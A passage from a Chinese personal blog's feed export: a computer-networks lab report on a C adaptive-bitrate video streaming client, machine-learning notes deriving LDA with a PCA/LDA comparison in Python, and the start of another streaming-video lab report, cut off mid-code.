class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*****5. 在下载结束后，统计QoE，并为之后的下载进行简单的ABR自适应决策**/</span></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> rebuffering_time=ReceiveSegment(video_segement, req, file_size);   <span class="comment">//获取播放器卡顿时间ms</span></span><br><span class="line"><span class="type">double</span> buffer_occupancy=GetBufferSize();    <span class="comment">//获取播放器缓冲区长度ms</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s tran time: %ld\n&quot;</span>, req, download_time);</span><br><span class="line"></span><br><span class="line"><span class="comment">//统计用户体验质量</span></span><br><span class="line">QoERecord(current_bitrate,last_bitrate,rebuffering_time);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">last_bitrate=current_bitrate;</span><br><span class="line"></span><br><span class="line"><span class="comment">//简单的码率自适应决策</span></span><br><span class="line"><span class="type">int</span> next_id=video_id+<span class="number">2</span>; <span class="comment">//间隔一个chunk进行下载</span></span><br><span class="line"><span class="keyword">if</span>(next_id&lt;=VIDEO_LEN<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="comment">/*****Without ABR******/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//char temp[REQUEST_SIZE]=&quot;ocean-1080p-8000k&quot;;</span></span><br><span class="line"><span class="comment">//        char suffix[6]=&quot;&quot;;</span></span><br><span class="line"><span class="comment">//        sprintf(suffix, &quot;-%d.ts&quot;, next_id);  </span></span><br><span class="line"><span class="comment">//        strcat( temp, suffix);</span></span><br><span class="line"><span class="comment">//        QueuePush(&amp;download_queue,temp);    //将决策结果入队</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/********With ABR**********/</span></span><br><span class="line">    <span class="keyword">if</span>(download_time&lt;<span class="number">200</span>)&#123;</span><br><span class="line">        <span class="type">char</span> temp[REQUEST_SIZE]=<span class="string">&quot;ocean-1080p-8000k&quot;</span>;</span><br><span class="line">        <span class="type">char</span> suffix[<span class="number">6</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">sprintf</span>(suffix, <span class="string">&quot;-%d.ts&quot;</span>, next_id);  </span><br><span class="line">        <span class="built_in">strcat</span>( temp, suffix);</span><br><span class="line">        QueuePush(&amp;download_queue,temp);    <span class="comment">//将决策结果入队</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(download_time&lt;<span class="number">600</span>)&#123;</span><br><span class="line">        <span class="type">char</span> temp[REQUEST_SIZE]=<span class="string">&quot;ocean-480p-2500k&quot;</span>;</span><br><span class="line">        <span class="type">char</span> suffix[<span class="number">6</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">sprintf</span>(suffix, <span class="string">&quot;-%d.ts&quot;</span>, next_id);  </span><br><span class="line">        <span class="built_in">strcat</span>( temp, suffix);</span><br><span class="line">        QueuePush(&amp;download_queue,temp);    <span class="comment">//将决策结果入队</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">char</span> temp[REQUEST_SIZE]=<span class="string">&quot;ocean-360p-1000k&quot;</span>;</span><br><span class="line">        <span class="type">char</span> suffix[<span class="number">6</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">sprintf</span>(suffix, <span class="string">&quot;-%d.ts&quot;</span>, next_id);  </span><br><span class="line">        <span class="built_in">strcat</span>( temp, suffix);</span><br><span class="line">        QueuePush(&amp;download_queue,temp);    <span class="comment">//将决策结果入队</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/***************************/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">//释放内存</span></span><br><span class="line"><span class="built_in">free</span>(video_segement);   </span><br><span class="line">video_segement=<span class="literal">NULL</span>;</span><br><span class="line">video_id++; <span class="comment">//更新下载id</span></span><br><span class="line">QueuePop(&amp;download_queue);</span><br><span class="line"><span class="comment">/*******************************************************************/</span></span><br></pre></td></tr></table></figure></p><p>记住在sample code中，释放内存部分代码<strong>没有出队操作</strong>，需要自行编写</p><p>可以看到，默认的ABR算法仅仅从下载时间的角度去实现</p><p>运行并输出QoE的累加和<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">QoECount();</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br></pre></td></tr></table></figure></p><p>发现默认的ABR算法能一般都能达到80+甚至100+</p><p><img src="/img/2024/04/exp2/1.png" alt="image.png"></p><p><img src="/img/2024/04/exp2/2.png" alt="image.png"></p><p><img src="/img/2024/04/exp2/3.png" alt="image.png"></p><h1 id="三、设计ABR算法"><a href="#三、设计ABR算法" class="headerlink" title="三、设计ABR算法"></a>三、设计ABR算法</h1><p>实验文档中提示我们能从几个角度去设计ABR算法：</p><ol><li>基于带宽预测</li><li>基于缓冲区的容量</li><li>基于神经网络</li></ol><p>由上述内容我们可以发现，默认的ABR算法只利用了<strong>下载时间(download_time)</strong>，其实还有两个变量：<strong>缓冲区长度(buffer_occupancy)</strong> 和 <strong>卡顿时间(rebuffering_time)</strong> 没有利用到</p><p>我们不妨定义一个评价标准，使其同时关联到这三个变量：</p><script type="math/tex; mode=display">standard = \theta_1 bufferOccupancy - \theta_2 downloadTime - \theta_3 rebufferingTime</script><p>为了方便讨论，我们先取$ \theta_1 = \theta_2 = \theta_3 = 1$，即</p><script type="math/tex; mode=display">standard = bufferOccupancy -  downloadTime - rebufferingTime</script><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> standard = buffer_occupancy - (<span class="type">double</span>)download_time - rebuffering_time;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, req);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;buffer occupancy: %.6f, download time: %.6f, rebufffering time: %.6f\n&quot;</span>,</span><br><span class="line">                buffer_occupancy, (<span class="type">double</span>)download_time, rebuffering_time);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;standard: %.6f\n&quot;</span>, standard);</span><br></pre></td></tr></table></figure><p>之后便是仿照默认ABR，根据标准值所在的区间，这里取边界值为<strong>-2000 和 2000</strong>，决定请求视频片段的码率：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> temp[REQUEST_SIZE] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(standard &gt; <span class="number">2000</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(temp, <span class="string">&quot;ocean-1080p-8000k&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(standard &gt; <span class="number">-2000</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(temp, <span class="string">&quot;ocean-480p-2500k&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(temp, <span class="string">&quot;ocean-360p-1000k&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> suffix[<span class="number">6</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(suffix, <span class="string">&quot;-%d.ts&quot;</span>, next_id);  </span><br><span class="line"><span class="built_in">strcat</span>( temp, suffix);</span><br><span class="line">QueuePush(&amp;download_queue,temp);    <span class="comment">//将决策结果入队</span></span><br></pre></td></tr></table></figure><p>测试发现这种方法能稳定120+，某些情况下稳定300+，比默认方法要高出几倍</p><p><img src="/img/2024/04/exp2/4.png" alt="image.png"></p><p><img src="/img/2024/04/exp2/5.png" alt="image.png"></p><p><img src="/img/2024/04/exp2/6.png" alt="image.png"></p><p><img src="/img/2024/04/exp2/7.png" alt="image.png"></p><p>想要继续优化算法的性能可以接着讨论standard的三个参数以及分割区间的两个边界值总共五个变量的值</p><h1 id="四、思考题"><a href="#四、思考题" class="headerlink" title="四、思考题"></a>四、思考题</h1><h2 id="思考题1"><a href="#思考题1" class="headerlink" title="思考题1"></a>思考题1</h2><p><strong>如果有某一用户群体，相较于其他人，对视频质量的波动没有那么在意，而较低的视频质量会使他们更加恼火。针对该用户群体，当前QoE评分方式是否合适？如果不合适，如何调整？</strong></p><p>实验文件在abrlib.h中定义的QoE如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 视频质量相关参数</span></span><br><span class="line"><span class="type">double</span> QoE_count = <span class="number">0</span>; <span class="comment">// 用户体验质量统计 (Quality of experience)</span></span><br><span class="line"><span class="type">double</span> alpha = <span class="number">0.001</span>;</span><br><span class="line"><span class="type">double</span> beta = <span class="number">0.0005</span>;</span><br><span class="line"><span class="type">double</span> gama = <span class="number">0.01</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记录当前下载的QoE</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">QoERecord</span><span class="params">(<span class="type">int</span> current_bitrate, <span class="type">int</span> last_bitrate, <span class="type">double</span> rebuffering_time)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">double</span> QoE = alpha * current_bitrate - beta * <span class="built_in">abs</span>(last_bitrate - current_bitrate) - gama * rebuffering_time;</span><br><span class="line">QoE_count += QoE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当用户对视频质量更加在意时，应该提高alpha的值；对视频质量的波动没那么在意，则应该适当降低beta的值</p><h2 id="思考题2"><a href="#思考题2" class="headerlink" title="思考题2"></a>思考题2</h2><p><strong>用户在观看常规视频时可以完整观看到视频的全部内容，而在沉浸式视频（360°视频、点云视频等）中，用户会选择性的观看部分视频内容。对于沉浸式视频，如何评估用户的视频观看体验？</strong></p><p>在360°视频中，用户只能看到部分的视频内容，所以只需要以这部分视频的质量（包括码率，卡顿时间，缓冲区时间等）来衡量用户的观看体验，而不是整个视频的质量。</p><p>360°视频在传输的过程中，可以将视频片段切分成许多tiles，根据用户的头部运动轨迹，预测用户下一步可能需要观看的部分视频，选择性地传输不同码率的这些视频</p><p>因此，还可以从由于切分tiles导致的视频片段<strong>空间上的码率波动</strong>，由于<strong>预测不准确性导致的延迟</strong>等角度评估用户的观看体验</p>]]></content>
      
      
      <categories>
          
          <category> 课程实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习笔记——LDA线性判别分析</title>
      <link href="/2024/03/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94LDA%E7%BA%BF%E6%80%A7%E5%88%A4%E5%88%AB%E5%88%86%E6%9E%90/"/>
      <url>/2024/03/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94LDA%E7%BA%BF%E6%80%A7%E5%88%A4%E5%88%AB%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>机器学习的东西真是又多又杂啊，之前刷吴恩达就见过主成分分析，即PCA(Principle Component Analysis)，没见过线性判别分析，即LDA(Linear Discriminant Analysis)。才知道前者是对无标签数据作压缩的，而后者可以对有标签的二分类、多分类任务的数据作压缩。</p><p>本文主要讲述了LDA算法的推导，以及展示了LDA算法的代码实现和应用。</p><p>参考资料：</p><p>周志华《机器学习》，人称西瓜书</p><p>更详细的算法推导：<a href="https://zhuanlan.zhihu.com/p/140070299">机器学习算法推导&amp;手写实现03——线性判别分析 - 知乎 (zhihu.com)</a></p><h1 id="一、算法推导"><a href="#一、算法推导" class="headerlink" title="一、算法推导"></a>一、算法推导</h1><p>由前言可知，LDA相比于PCA，是用来处理<strong>有标签数据</strong>的，为了使压缩后的数据仍然能表示分类的情况，我们应该让<strong>同类的样本尽可能靠近，异类的样本尽可能远离</strong>。</p><p>数学表示为：给定数据集$ D = {x_i, y_i}_{i=1}^m $，该数据集共有$m$个样本，每个样本包含一个数据，即一个$n$维的向量$x_i$，以及一个标签，即一个数$y_i$，代表该数据点所在的类别。</p><p>当$y_i \in {0, 1}$，说明这是一个二分类任务，我们先从简单的二分类开始讨论。</p><h2 id="1-二分类"><a href="#1-二分类" class="headerlink" title="1. 二分类"></a>1. 二分类</h2><h3 id="1-1-优化目标"><a href="#1-1-优化目标" class="headerlink" title="1.1 优化目标"></a>1.1 优化目标</h3><p>接下来，我们要用数学语言来表示同类的样本尽可能靠近，异类的样本尽可能远离这两个任务。</p><p><strong>同类的样本尽可能靠近</strong>，也就是<strong>同类之间的方差要尽可能小</strong></p><p>设压缩前，两个类的协方差矩阵分别为$\Sigma_0$和$\Sigma_1$</p><p>那么，压缩后的两个类的协方差矩阵为$\omega^T \Sigma_0 \omega$和$\omega^T \Sigma_1 \omega$</p><p>定义“类内散度矩阵”（with-class scatter matrix）为</p><script type="math/tex; mode=display">S_{\omega} = \Sigma_0 + \Sigma_1  = \sum \limits_{x \in X_0} (x - \mu_0)^T + \sum \limits_{x \in X_1} (x - \mu_1)^T</script><p>那么，同类之间的方差要尽可能小，就是要<strong>最小化$\omega^T S_{\omega} \omega$</strong></p><p><strong>异类的样本尽可能远离</strong>，也就是<strong>异类样本的均值的差值要尽可能大</strong></p><p>设压缩前，两个类的均值分别为$\mu_0$和$\mu_1$</p><p>那么，压缩后的两个类的均值为$\omega^T \mu_0$和$\omega^T \mu_1$</p><p>定义“类间散度矩阵”（between-class scatter matrix）为</p><script type="math/tex; mode=display">S_b = (\mu_0 - \mu_1)(\mu_0 - \mu_1)^T</script><p>那么，异类的样本尽可能远离，就是要<strong>最大化$\omega^T S_b\omega$</strong></p><p>将上述两条件统一到一个式子，我们的优化目标就变为了</p><p><strong>最大化 $ J = \frac{\omega^T S_b\omega}{\omega^T S_{\omega} \omega} $</strong></p><h3 id="1-2-数学推导"><a href="#1-2-数学推导" class="headerlink" title="1.2 数学推导"></a>1.2 数学推导</h3><p>由于$J = \frac{\omega^T S_b\omega}{\omega^T S_{\omega} \omega}$分子分母都是关于$\omega$的二次项，因此，求解上述问题与$\omega$的大小无关，只与$\omega$的的方向有关。</p><p>我们不妨假设$\omega^T S_{\omega} \omega = 1$，问题转化为</p><script type="math/tex; mode=display">min_{\omega} \space -\omega^T S_b\omega</script><script type="math/tex; mode=display">st. \space \omega^T S_{\omega} \omega = 1</script><p>由拉格朗日乘子法，得</p><script type="math/tex; mode=display">L(\omega) = -\omega^T S_b\omega + \lambda (\omega^T S_{\omega} \omega - 1)</script><p>令 $ \frac{\partial L(\omega)}{\partial \omega} = -2 S_b \omega + 2 \lambda S_{\omega} \omega = 0$</p><p>得 $ S_b \omega = \lambda S_{\omega} \omega \space \space  $</p><p>又 $ S_b \omega =  (\mu_0 - \mu_1)(\mu_0 - \mu_1)^T \omega $，其中$(\mu_0 - \mu_1)^T \omega$可看作是个标量，因此$ S_b \omega $的方向恒与$ \mu_0 - \mu_1 $相同，不妨令</p><script type="math/tex; mode=display">S_b \omega = \lambda (\mu_0 - \mu_1)  \space \space</script><p>得</p><script type="math/tex; mode=display">S_{\omega} \omega = \mu_0 - \mu_1</script><script type="math/tex; mode=display">\omega = S_{\omega}^{-1} (\mu_0 - \mu_1)</script><p>在实践中，常常对$S_{\omega}$做奇异值分解：$ S_{\omega} = U \Sigma V^T$，故有$ S_{\omega}^{-1} = V \Sigma^{-1} U^T$，从而得到$S_{\omega}^{-1} $</p><h2 id="2-多分类"><a href="#2-多分类" class="headerlink" title="2. 多分类"></a>2. 多分类</h2><h3 id="2-1-问题求解"><a href="#2-1-问题求解" class="headerlink" title="2.1 问题求解"></a>2.1 问题求解</h3><p>将问题扩展到多分类，定义所有样本的均值为$\mu$，每个类对应的样本数量为$m_i$，那么重新定义“类间散度矩阵”为</p><script type="math/tex; mode=display">S_b = \sum\limits_{i=1}^N m_i (\mu_i - \mu) ( \mu_i - \mu )^T</script><p>设总共由$ N $个类，重新定义“类内散度矩阵”为</p><script type="math/tex; mode=display">S_{\omega} = \sum\limits_{i=1}^N \sum \limits_{x \in X_i} (x - \mu_i) (x - \mu_i )^T</script><p>在上述二分类中，我们将样本投影到一维空间，也就是一条直线上，而在多分类中，我们将样本投影到$N - 1$维空间，记投影矩阵 $ W \in R^{d \times (N -1)}$，其中$ d $表示原样本的维度数。</p><p>同理可得</p><script type="math/tex; mode=display">S_b W = \lambda S_{\omega} W</script><script type="math/tex; mode=display">S_{\omega}^{-1} S_b W = \lambda W</script><p>因此$ W $的解是$ S_{\omega}^{-1} S_b $的最大$N - 1$个特征值所对应特征向量所组成的矩阵</p><h3 id="2-2-全局散度矩阵"><a href="#2-2-全局散度矩阵" class="headerlink" title="2.2 全局散度矩阵"></a>2.2 全局散度矩阵</h3><p>除了使用$S_b$和$S_{\omega}$作为度量的标准，多分类LDA还可以有多种不同的实现，引入“<strong>全局散度矩阵</strong>”</p><script type="math/tex; mode=display">S_t = \sum \limits_{i=1}^m (x_i - \mu)(x_i - \mu)^T</script><p>可以证明 $ S_t = S_b + S_{\omega} $，如下：</p><p>$ \begin{aligned}<br>S_b &amp;= \sum\limits_{i=1}^N m_i (\mu_i - \mu) ( \mu_i - \mu )^T \<br>&amp;= \sum\limits_{i=1}^N m_i (\mu_i \mu_i^T - \mu \mu_i^T - \mu_i \mu^T + \mu \mu^T)<br>\end{aligned}$</p><p>其中，$m_i \mu \mu_i^T == \sum\limits_{x \in X_i} \mu x^T $，$ m_i \mu_i \mu^T = \sum\limits_{x \in X_i} X \mu^T$，那么有</p><p>$ S_b =  \sum\limits_{i=1}^N \sum\limits_{x \in X_i} (\mu_i \mu_i^T -\mu x^T - x \mu^T + \mu \mu^T)$</p><p>又有</p><p>$ \begin{aligned}<br>S_{\omega} &amp;= \sum\limits_{i=1}^N \sum \limits_{x \in X_i} (x - \mu_i) (x - \mu_i )^T  \<br>&amp;= \sum\limits_{i=1}^N \sum \limits_{x \in X_i} (x x^T - \mu_i x^T - x \mu_i^T + \mu_i \mu_i^T)<br>\end{aligned}$</p><p>那么，</p><p>$ S_b + S_{\omega} = \sum\limits_{i=1}^N \sum \limits_{x \in X_i} (x x^T -\mu x^T - x \mu^T + \mu \mu^T - \mu_i x^T - x \mu_i^T +  2 \mu_i \mu_i^T)$</p><p>其中，$ \sum\limits_{i=1}^N \sum \limits_{x \in X_i} (- \mu_i x^T - x \mu_i^T +  2 \mu_i \mu_i^T) = 0$</p><p>则有</p><p>$ \begin{aligned}<br>S_b + S_{\omega} &amp;= \sum\limits_{i=1}^N \sum \limits_{x \in X_i} (x x^T -\mu x^T - x \mu^T + \mu \mu^T) \<br>&amp;= \sum\limits_{i=1}^N \sum \limits_{x \in X_i} (x - \mu) (x - \mu)^T \<br>&amp;= \sum\limits_{i=1}^m  (x_i - \mu) (x_i - \mu)^T = S_t<br>\end{aligned} $</p><p>证毕</p><h2 id="3-等价模型表示"><a href="#3-等价模型表示" class="headerlink" title="3. 等价模型表示"></a>3. 等价模型表示</h2><p>以上的算法推导是基于$ max_{\omega} \frac{\omega^T S_b\omega}{\omega^T S_{\omega} \omega} $，或者说，基于$max_W \frac{ tr(W^T S_b W) }{ tr(W^T S_{\omega} W) }$，我们称之为LDA的除法模型。</p><p>实际上，LDA还有多种等价的模型表示，比如</p><p><strong>(1) 减法模型：</strong></p><script type="math/tex; mode=display">max_W tr(W^T S_b W) - tr(W^T S_{\omega} W)</script><script type="math/tex; mode=display">st. \space \space tr(W^T W) = 1</script><p>求解得到</p><script type="math/tex; mode=display">(S_{\omega} - S_b) W = \lambda W</script><p>即$W$是$S_{\omega} - S_b$前$N-1$个最大特征值对应的特征向量组成的矩阵</p><p><strong>(2) 除法正则模型：</strong></p><script type="math/tex; mode=display">max_W \frac{ tr(W^T S_b W) }{ tr(W^T S_{\omega} W) } + \lambda tr(W^T W)</script><script type="math/tex; mode=display">st. \space \space tr(W^T S_{\omega} W) = 1</script><p>由拉格朗日乘子法，得</p><script type="math/tex; mode=display">L = tr(W^T S_b W) + \lambda tr(W^T W) + \beta (tr(W^T S_{\omega} W) - 1)</script><script type="math/tex; mode=display">\frac{\partial L}{\partial W} = 2 S_b W + 2 \lambda W + 2 \beta S_{\omega} W = 0</script><p>得</p><script type="math/tex; mode=display">S_{\omega}^{-1}(S_b + \lambda I) W = -\beta W</script><p>即$W$是$S_{\omega}^{-1}(S_b + \lambda I)$前$N-1$个最大特征值对应的特征向量组成的矩阵</p><p><strong>(3) 减法正则模型：</strong></p><script type="math/tex; mode=display">max_W tr(W^T S_b W) - tr(W^T S_{\omega} W) - \lambda tr(W^T W)</script><script type="math/tex; mode=display">st. \space \space tr(W^T W) = 1</script><p>求得问题的解仍然是$S_{\omega} - S_b$前$N-1$个最大特征值对应的特征向量组成的矩阵</p><h1 id="二、代码示例"><a href="#二、代码示例" class="headerlink" title="二、代码示例"></a>二、代码示例</h1><p>大半都是gpt写的（</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">X, y = read_data(PATH)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分训练集和测试集</span></span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.1</span>, random_state=<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line">accuracy_pca = []</span><br><span class="line">accuracy_lda = []</span><br><span class="line"></span><br><span class="line">n_components_range = <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">35</span>, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> n_components <span class="keyword">in</span> n_components_range:</span><br><span class="line">    <span class="comment"># PCA</span></span><br><span class="line">    pca = PCA(n_components=n_components)</span><br><span class="line">    X_train_pca = pca.fit_transform(X_train)</span><br><span class="line">    X_test_pca = pca.transform(X_test)</span><br><span class="line">    knn_pca = KNeighborsClassifier()</span><br><span class="line">    knn_pca.fit(X_train_pca, y_train)</span><br><span class="line">    y_pred_pca = knn_pca.predict(X_test_pca)</span><br><span class="line">    accuracy_pca.append(accuracy_score(y_test, y_pred_pca))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LDA</span></span><br><span class="line">    lda = LinearDiscriminantAnalysis(n_components=n_components)</span><br><span class="line">    X_train_lda = lda.fit_transform(X_train, y_train)</span><br><span class="line">    X_test_lda = lda.transform(X_test)</span><br><span class="line">    knn_lda = KNeighborsClassifier()</span><br><span class="line">    knn_lda.fit(X_train_lda, y_train)</span><br><span class="line">    y_pred_lda = knn_lda.predict(X_test_lda)</span><br><span class="line">    accuracy_lda.append(accuracy_score(y_test, y_pred_lda))</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots()</span><br><span class="line">ax.plot(n_components_range, accuracy_pca, label=<span class="string">&#x27;PCA&#x27;</span>)</span><br><span class="line">ax.plot(n_components_range, accuracy_lda, label=<span class="string">&#x27;LDA&#x27;</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;n_components&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;Accuracy&#x27;</span>)</span><br><span class="line">ax.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>在ORL数据集的测试结果如下：</p><p><img src="/img/2024/03/LDA.png" alt="image.png"></p><p>其实可以再探讨一下减法模型还有正则模型的性能，但是sklearn貌似不支持(?)，得手搓，急着交作业就没再搞了。。</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> PCA </tag>
            
            <tag> LDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【SZU计算机网络实验】实现流式视频传输</title>
      <link href="/2024/03/19/%E3%80%90SZU%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E3%80%91%E5%AE%9E%E7%8E%B0%E6%B5%81%E5%BC%8F%E8%A7%86%E9%A2%91%E4%BC%A0%E8%BE%93/"/>
      <url>/2024/03/19/%E3%80%90SZU%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E3%80%91%E5%AE%9E%E7%8E%B0%E6%B5%81%E5%BC%8F%E8%A7%86%E9%A2%91%E4%BC%A0%E8%BE%93/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一百年没有更新博客了，都怪开学一堆杂活（x</p><p>那就顺手把实验报告转到这边吧owo</p><p>本实验为SZU原创实验，实验开发团队的老师和助教们都很有耐心。。大赞，环境没配好去群里问是秒回的</p><p>相关资料：</p><p>实验文档：<a href="http://course.snrc.site/computer-networks/#">计算机网络课程综合实验平台 (snrc.site)</a></p><h1 id="一、实验介绍"><a href="#一、实验介绍" class="headerlink" title="一、实验介绍"></a>一、实验介绍</h1><p>该实验主要实现了一个服务端和一个客户端。其中，服务端利用缓冲区逐段向客户端发送多个视频片段，并在客户端逐段接收，并利用已经设计好的播放器，在网页中播放连续的视频。</p><h1 id="二、实验过程"><a href="#二、实验过程" class="headerlink" title="二、实验过程"></a>二、实验过程</h1><h2 id="0-环境搭建"><a href="#0-环境搭建" class="headerlink" title="0. 环境搭建"></a>0. 环境搭建</h2><p>实验文件中包含了压缩包exp1-lib.zip，exp-code.zip，cne.zip</p><p>将其解压，并把前两个压缩包（exp1-lib.zip和exp-code.zip）解压后的文件置于一个目录下，于cne.zip解压出来的文件夹devcpp6中的<strong>devcppPortable.exe</strong>中打开client.c和server.c文件，选择编译环境为<strong>Computer-networks</strong></p><p><img src="/img/2024/03/devenvir.png" alt="devenvir.png"></p><h2 id="1-单文件视频传输"><a href="#1-单文件视频传输" class="headerlink" title="1. 单文件视频传输"></a>1. 单文件视频传输</h2><p>阅读代码发现实验文件中已经实现了：</p><p>1）服务端的初始化阶段，包括创建套接字，绑定套接字和监听套接字，以及接收客户端下载请求和发送文件大小给客户端，发送文件结束符和关闭文件。</p><p>2）客户端的初始化阶段，向服务器请求文件并接受文件的大小，检查文件结束符后将接收到的视频写入文件中</p><p>我们需要实现的是：</p><p>1）在服务端：</p><p>将文件的内容循环读取到缓冲区中，再将缓冲区的内容发送给客户端，注意<strong>读到文件末尾可能无法完整填充整个缓冲区，需要做特判</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">// 发送视频片段</span></span><br><span class="line">     <span class="type">int</span> send_count = <span class="number">0</span>;</span><br><span class="line">     <span 